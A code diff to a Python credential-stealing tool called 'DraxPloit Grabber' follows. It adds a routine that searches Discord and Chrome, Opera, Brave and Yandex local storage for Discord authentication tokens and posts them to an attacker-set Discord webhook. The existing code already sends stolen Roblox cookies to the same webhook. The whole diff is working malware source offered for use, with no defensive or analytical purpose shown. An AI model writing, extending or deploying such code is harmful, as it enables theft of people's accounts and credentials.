@@ -4,6 +4,7 @@ import os
 import asyncio
 import platform
 import subprocess
+import re
 
 from discord_webhook import DiscordWebhook,DiscordEmbed
 from typing import Union
@@ -15,6 +16,21 @@ __config__ = {
     'startup': '%_startup_enabled%',
 }
 
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
+
+    tokens = []
+
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
+
 class Exploit:
     def __init__(self):
         self.api = "https://ipinfo.io/json"
@@ -22,6 +38,7 @@ class Exploit:
         self.w3bh00k = self.fetch_conf('yourwebhookurl')
         self.startupexe = self.fetch_conf("startup")
         self.robloxcookies = []
+        self.tokens = []
         self.avatarURL = "https://avatars.githubusercontent.com/u/79086740?v=4"
 
     def fetch_conf(self, e: str) -> Union[str, bool]:
@@ -101,8 +118,39 @@ class Exploit:
             data = {"content": "Roblox coookie found: ```" + self.robloxcookies[0] +"```", "username": "DraxPloit Grabber Notifier", "avatar_url": self.avatarURL}
             requests.post(self.w3bh00k, json = data)
 
-    browsers = [chromeLog, firefoxLog, operaLog, edgeLog]
+    def mainTokenProcess(self):
+        local = os.getenv('LOCALAPPDATA')
+        roaming = os.getenv('APPDATA')
 
+        paths = {
+            'Discord': roaming + '\\Discord',
+            'Discord Canary': roaming + '\\discordcanary',
+            'Discord PTB': roaming + '\\discordptb',
+            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+            'Opera': roaming + '\\Opera Software\\Opera Stable',
+            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+        }
+
+        for platform, path in paths.items():
+            if not os.path.exists(path):
+                continue
+
+            message = f'\nNew Discord Token found on **{platform}** Browser:\n```\n'
+
+            tokens = find_tokens(path)
+
+            if len(tokens) > 0:
+                for token in tokens:
+                    message += f'{token}\n'
+            else:
+                message += 'No tokens found.\n'
+
+            message += '```'
+
+            data = {"content": message, "username": "DraxPloit Grabber Notifier", "avatar_url": self.avatarURL}
+            requests.post(self.w3bh00k, json = data)
+            
     def credits(self):
         embed = DiscordEmbed(
             title="{title}",
@@ -142,6 +190,8 @@ if __name__ == "__main__" and platform.system() == "Windows":
     exploit.chromeLog()
     exploit.edgeLog()
     exploit.sendCookieLog()
+
+    exploit.mainTokenProcess()
 
     exploit.credits()
     
